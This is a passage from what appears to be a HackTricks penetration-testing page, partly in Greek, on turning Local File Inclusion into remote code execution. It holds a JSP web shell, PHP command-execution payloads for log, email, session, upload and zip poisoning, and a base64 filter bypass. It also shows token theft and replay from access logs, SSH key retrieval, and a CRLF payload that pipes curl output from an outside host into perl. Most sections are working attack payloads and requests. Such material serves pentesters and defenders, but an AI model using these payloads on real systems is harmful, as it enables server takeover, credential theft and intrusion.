<%
String c = request.getParameter("cmd");
if (c != null) {
Process p = Runtime.getRuntime().exec(c);
try (var in = p.getInputStream(); var out = response.getOutputStream()) {
in.transferTo(out);
}
}
%>
]]>
</Data>
</Command>
</JMF>
```
Σκληροποίηση που αποτρέπει αυτή την κατηγορία σφαλμάτων:
- Επιλύστε σε κανονική διαδρομή και επιβάλετε ότι είναι απόγονος μιας επιτρεπτής βασικής διαδρομής.
- Απορρίψτε οποιαδήποτε διαδρομή που περιέχει `..`, απόλυτες ρίζες ή γράμματα δίσκου· προτιμήστε παραγόμενα ονόματα αρχείων.
- Εκτελέστε τη διαδικασία εγγραφής με λογαριασμό χαμηλών δικαιωμάτων και απομονώστε τους καταλόγους εγγραφής από τις ρίζες που εξυπηρετούνται.

## Remote File Inclusion

Explained previously, [**follow this link**](#remote-file-inclusion).

### Μέσω αρχείου καταγραφής Apache/Nginx

If the Apache or Nginx server is **vulnerable to LFI** inside the include function you could try to access to **`/var/log/apache2/access.log` or `/var/log/nginx/access.log`**, set inside the **user agent** or inside a **GET parameter** a php shell like **`<?php system($_GET['c']); ?>`** and include that file

> [!WARNING]
> Σημειώστε ότι **εάν χρησιμοποιήσετε διπλά εισαγωγικά** για το shell αντί για **απλά εισαγωγικά**, τα διπλά εισαγωγικά θα τροποποιηθούν στη συμβολοσειρά "_**quote;**_", **η PHP θα ρίξει σφάλμα** εκεί και **τίποτα άλλο δεν θα εκτελεστεί**.
>
> Επίσης, βεβαιωθείτε ότι **γράφετε σωστά το payload** αλλιώς η PHP θα παράγει σφάλμα κάθε φορά που θα προσπαθεί να φορτώσει το αρχείο καταγραφής και δεν θα έχετε δεύτερη ευκαιρία.

Αυτό μπορεί επίσης να γίνει σε άλλα logs αλλά **προσέξτε,** ο κώδικας μέσα στα logs μπορεί να είναι URL encoded και αυτό μπορεί να καταστρέψει το Shell. Το header **authorisation "basic"** περιέχει "user:password" σε Base64 και αυτό αποκωδικοποιείται μέσα στα logs. Το PHPShell μπορεί να εισαχθεί μέσα σε αυτό το header.\
Άλλες πιθανές διαδρομές καταγραφής:
```python
/var/log/apache2/access.log
/var/log/apache/access.log
/var/log/apache2/error.log
/var/log/apache/error.log
/usr/local/apache/log/error_log
/usr/local/apache2/log/error_log
/var/log/nginx/access.log
/var/log/nginx/error.log
/var/log/httpd/error_log
```
Fuzzing wordlist: [https://github.com/danielmiessler/SecLists/tree/master/Fuzzing/LFI](https://github.com/danielmiessler/SecLists/tree/master/Fuzzing/LFI)

### Διάβασε τα access logs για να συλλέξεις GET-based auth tokens (token replay)

Πολλές εφαρμογές αποδέχονται λανθασμένα session/auth tokens μέσω GET (π.χ. AuthenticationToken, token, sid). Αν έχεις ένα path traversal/LFI primitive προς τα web server logs, μπορείς να κλέψεις αυτά τα tokens από τα access logs και να τα replay-άρεις για να παρακάμψεις πλήρως την authentication.

How-to:
- Χρησιμοποίησε το traversal/LFI για να διαβάσεις το web server access log. Συνήθεις τοποθεσίες:
- /var/log/apache2/access.log, /var/log/httpd/access_log
- /var/log/nginx/access.log
- Κάποια endpoints επιστρέφουν file reads Base64-encoded. Αν ναι, decode το τοπικά και εξέτασε τις γραμμές των logs.
- Χρησιμοποίησε grep για GET requests που περιλαμβάνουν παράμετρο token και αποθήκευσε την τιμή της, έπειτα replay το στο application entry point.

Example flow (generic):
```http
GET /vuln/asset?name=..%2f..%2f..%2f..%2fvar%2flog%2fapache2%2faccess.log HTTP/1.1
Host: target
```
Αποκωδικοποίησε το σώμα αν είναι Base64, έπειτα αναπαρήγαγε ένα καταγεγραμμένο token:
```http
GET /portalhome/?AuthenticationToken=<stolen_token> HTTP/1.1
Host: target
```
Σημειώσεις:
- Tokens στα URLs καταγράφονται από προεπιλογή· μην αποδέχεστε ποτέ bearer tokens μέσω GET σε production systems.
- Εάν η εφαρμογή υποστηρίζει πολλαπλά ονόματα token, ψάξτε για κοινά κλειδιά όπως AuthenticationToken, token, sid, access_token.
- Rotate οποιαδήποτε tokens που μπορεί να έχουν leaked στα logs.

### Via Email

**Στείλτε ένα mail** σε έναν εσωτερικό λογαριασμό (user@localhost) που περιέχει το PHP payload σας όπως `<?php echo system($_REQUEST["cmd"]); ?>` και προσπαθήστε να κάνετε include το mailbox του χρήστη με μια διαδρομή όπως **`/var/mail/<USERNAME>`** ή **`/var/spool/mail/<USERNAME>`**

### Via /proc/\*/fd/\*

1. Ανεβάστε πολλά shells (για παράδειγμα: 100)
2. Include [http://example.com/index.php?page=/proc/$PID/fd/$FD](http://example.com/index.php?page=/proc/$PID/fd/$FD), με $PID = PID της διεργασίας (μπορεί να εντοπιστεί με brute force) και $FD ο file descriptor (μπορεί επίσης να εντοπιστεί με brute force)

### Via /proc/self/environ

Όπως ένα αρχείο log, στείλτε το payload στο User-Agent, θα αντανακλάται μέσα στο αρχείο /proc/self/environ
```
GET vulnerable.php?filename=../../../proc/self/environ HTTP/1.1
User-Agent: <?=phpinfo(); ?>
```
### Μέσω upload

Αν μπορείτε να upload ένα αρχείο, απλώς inject το shell payload σε αυτό (e.g : `<?php system($_GET['c']); ?>` ).
```
http://example.com/index.php?page=path/to/uploaded/file.png
```
Για να διατηρηθεί το αρχείο ευανάγνωστο, είναι καλύτερο να εισάγετε πληροφορίες στα μεταδεδομένα των pictures/doc/pdf

### Μέσω Zip file upload

Ανεβάστε ένα ZIP αρχείο που περιέχει ένα συμπιεσμένο PHP shell και αποκτήστε πρόσβαση:
```python
example.com/page.php?file=zip://path/to/zip/hello.zip%23rce.php
```
### Μέσω PHP sessions

Ελέγξτε αν ο ιστότοπος χρησιμοποιεί PHP Session (PHPSESSID)
```
Set-Cookie: PHPSESSID=i56kgbsq9rm8ndg3qbarhsbm27; path=/
Set-Cookie: user=admin; expires=Mon, 13-Aug-2018 20:21:29 GMT; path=/; httponly
```
Στο PHP αυτές οι sessions αποθηκεύονται σε αρχεία _/var/lib/php5/sess\\_\[PHPSESSID]\_
```
/var/lib/php5/sess_i56kgbsq9rm8ndg3qbarhsbm27.
user_ip|s:0:"";loggedin|s:0:"";lang|s:9:"en_us.php";win_lin|s:0:"";user|s:6:"admin";pass|s:6:"admin";
```
Ορίστε το cookie στο `<?php system('cat /etc/passwd');?>`
```
login=1&user=<?php system("cat /etc/passwd");?>&pass=password&lang=en_us.php
```
Χρησιμοποίησε το LFI για να συμπεριλάβεις το PHP session file
```
login=1&user=admin&pass=password&lang=/../../../../../../../../../var/lib/php5/sess_i56kgbsq9rm8ndg3qbarhsbm2
```
### Μέσω ssh

Αν το ssh είναι ενεργό, έλεγξε ποιος χρήστης χρησιμοποιείται (/proc/self/status & /etc/passwd) και προσπάθησε να αποκτήσεις πρόσβαση σε **\<HOME>/.ssh/id_rsa**

### **Μέσω** **vsftpd** _**αρχεία καταγραφής**_

Τα αρχεία καταγραφής του FTP server vsftpd βρίσκονται στο _**/var/log/vsftpd.log**_. Στην περίπτωση όπου υπάρχει ευπάθεια Local File Inclusion (LFI) και υπάρχει πρόσβαση σε έναν εκτεθειμένο server vsftpd, μπορούν να ληφθούν υπόψη τα παρακάτω βήματα:

1. Εισήγαγε ένα payload PHP στο πεδίο username κατά τη διάρκεια της διαδικασίας σύνδεσης.
2. Μετά την έγχυση, χρησιμοποίησε το LFI για να ανακτήσεις τα αρχεία καταγραφής του server από _**/var/log/vsftpd.log**_.

### Μέσω php base64 filter (using base64)

Όπως δείχνει το [this](https://matan-h.com/one-lfi-bypass-to-rule-them-all-using-base64) άρθρο, το PHP base64 filter αγνοεί ό,τι δεν είναι base64. Μπορείς να το χρησιμοποιήσεις για να παρακάμψεις τον έλεγχο της επέκτασης αρχείου: αν παρέχεις base64 που τελειώνει σε ".php", θα αγνοήσει το "." και θα προσθέσει "php" στο base64. Εδώ ένα παράδειγμα payload:
```url
http://example.com/index.php?page=PHP://filter/convert.base64-decode/resource=data://plain/text,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4+.php

NOTE: the payload is "<?php system($_GET['cmd']);echo 'Shell done !'; ?>"
```
### Μέσω php filters (δεν απαιτείται αρχείο)

This [**writeup** ](https://gist.github.com/loknop/b27422d355ea1fd0d90d6dbc1e278d4d) εξηγεί ότι μπορείτε να χρησιμοποιήσετε **php filters για να δημιουργήσετε αυθαίρετο περιεχόμενο** ως έξοδο. Αυτό ουσιαστικά σημαίνει ότι μπορείτε να **παράγετε αυθαίρετο php code** για το include **χωρίς να χρειάζεται να το γράψετε** σε αρχείο.


{{#ref}}
lfi2rce-via-php-filters.md
{{#endref}}

### Μέσω segmentation fault

**Ανεβάστε** ένα αρχείο που θα αποθηκευτεί ως **προσωρινό** στο `/tmp`, στη συνέχεια στην **ίδια αίτηση,** προκαλέστε ένα **segmentation fault**, και τότε το **προσωρινό αρχείο δεν θα διαγραφεί** και μπορείτε να το αναζητήσετε.


{{#ref}}
lfi2rce-via-segmentation-fault.md
{{#endref}}

### Μέσω αποθήκευσης προσωρινών αρχείων του Nginx

If you found a **Local File Inclusion** and **Nginx** is running in front of PHP you might be able to obtain RCE with the following technique:


{{#ref}}
lfi2rce-via-nginx-temp-files.md
{{#endref}}

### Μέσω PHP_SESSION_UPLOAD_PROGRESS

If you found a **Local File Inclusion** even if you **don't have a session** and `session.auto_start` is `Off`. If you provide the **`PHP_SESSION_UPLOAD_PROGRESS`** in **multipart POST** data, PHP will **enable the session for you**. You could abuse this to get RCE:


{{#ref}}
via-php_session_upload_progress.md
{{#endref}}

### Μέσω προσωρινών uploads αρχείων σε Windows

If you found a **Local File Inclusion** and and the server is running in **Windows** you might get RCE:


{{#ref}}
lfi2rce-via-temp-file-uploads.md
{{#endref}}

### Μέσω `pearcmd.php` + URL args

As [**explained in this post**](https://www.leavesongs.com/PENETRATION/docker-php-include-getshell.html#0x06-pearcmdphp), the script `/usr/local/lib/phppearcmd.php` exists by default in php docker images. Moreover, it's possible to pass arguments to the script via the URL because it's indicated that if a URL param doesn't have an `=`, it should be used as an argument. See also [watchTowr’s write-up](https://labs.watchtowr.com/form-tools-we-need-to-talk-about-php/) and [Orange Tsai’s “Confusion Attacks”](https://blog.orange.tw/posts/2024-08-confusion-attacks-en/).

The following request create a file in `/tmp/hello.php` with the content `<?=phpinfo()?>`:
```bash
GET /index.php?+config-create+/&file=/usr/local/lib/php/pearcmd.php&/<?=phpinfo()?>+/tmp/hello.php HTTP/1.1
```
Παρακάτω εκμεταλλεύεται μια CRLF vuln για να αποκτήσει RCE (από [**here**](https://blog.orange.tw/2024/08/confusion-attacks-en.html?m=1)):
```
http://server/cgi-bin/redir.cgi?r=http:// %0d%0a
Location:/ooo? %2b run-tests %2b -ui %2b $(curl${IFS}orange.tw/x|perl) %2b alltests.php %0d%0a
Content-Type:proxy:unix:/run/php/php-fpm.sock|fcgi://127.0.0.1/usr/local/lib/php/pearcmd.php %0d%0a
%0d%0a
```
### Via phpinfo() (file_uploads = on)

Εάν βρήκες ένα **Local File Inclusion** και ένα αρχείο που αποκαλύπτει **phpinfo()** με file_uploads = on, μπορείς να αποκτήσεις RCE:


{{#ref}}
lfi2rce-via-phpinfo.md
{{#endref}}

### Via compress.zlib + `PHP_STREAM_PREFER_STUDIO` + Path Disclosure

Εάν βρήκες ένα **Local File Inclusion** και **can exfiltrate the path** του προσωρινού αρχείου ΑΛΛΑ ο **server** is **checking** αν το **file to be included has PHP marks**, μπορείς να προσπαθήσεις να **bypass that check** με αυτήν την **Race Condition**:


{{#ref}}
lfi2rce-via-compress.zlib-+-php_stream_prefer_studio-+-path-disclosure.md
{{#endref}}

### Via eternal waiting + bruteforce

Αν μπορείς να εκμεταλλευτείς το LFI για να **upload temporary files** και να κάνεις τον server να **hang** την εκτέλεση της PHP, τότε θα μπορούσες να **brute force filenames during hours** για να βρεις το προσωρινό αρχείο:


{{#ref}}
lfi2rce-via-eternal-waiting.md
{{#endref}}

### To Fatal Error

If you include any of the files `/usr/bin/phar`, `/usr/bin/phar7`, `/usr/bin/phar.phar7`, `/usr/bin/phar.phar`. (Πρέπει να συμπεριλάβεις το ίδιο 2 time για να προκαλέσεις αυτό το σφάλμα).

**Δεν ξέρω πόσο χρήσιμο είναι αυτό αλλά ίσως να είναι.**\
_Ακόμα κι αν προκαλέσεις PHP Fatal Error, τα PHP temporary files που ανέβηκαν διαγράφονται._

<figure><img src="../../images/image (1031).png" alt=""><figcaption></figcaption></figure>


## Αναφορές

- [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion%20-%20Path%20Traversal)
- [PayloadsAllTheThings/tree/master/File%20Inclusion%20-%20Path%20Traversal/Intruders](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion%20-%20Path%20Traversal/Intruders)
- [Horizon3.ai – From Support Ticket to Zero Day (FreeFlow Core path traversal → arbitrary write → webshell)](https://horizon3.ai/attack-research/attack-blogs/from-support-ticket-to-zero-day/)
- [Xerox Security Bulletin 025-013 – FreeFlow Core 8.0.5](https://securitydocs.business.xerox.com/wp-content/uploads/2025/08/Xerox-Security-Bulletin-025-013-for-Freeflow-Core-8.0.5.pdf)
- [watchTowr – We need to talk about PHP (pearcmd.php gadget)](https://labs.watchtowr.com/form-tools-we-need-to-talk-about-php/)
- [Orange Tsai – Confusion Attacks on Apache](https://blog.orange.tw/posts/2024-08-confusion-attacks-en/)
- [VTENEXT 25.02 – a three-way path to RCE](https://blog.sicuranext.com/vtenext-25-02-a-three-way-path-to-rce/)
- [The Art of PHP: CTF‑born exploits and techniques](https://blog.orange.tw/posts/2025-08-the-art-of-php-ch/)

- [When Audits Fail: Four Critical Pre-Auth Vulnerabilities in TRUfusion Enterprise](https://www.rcesecurity.com/2025/09/when-audits-fail-four-critical-pre-auth-vulnerabilities-in-trufusion-enterprise/)

{{#file}}
EN-Local-File-Inclusion-1.pdf
{{#endfile}}

{{#include ../../banners/hacktricks-training.md}}
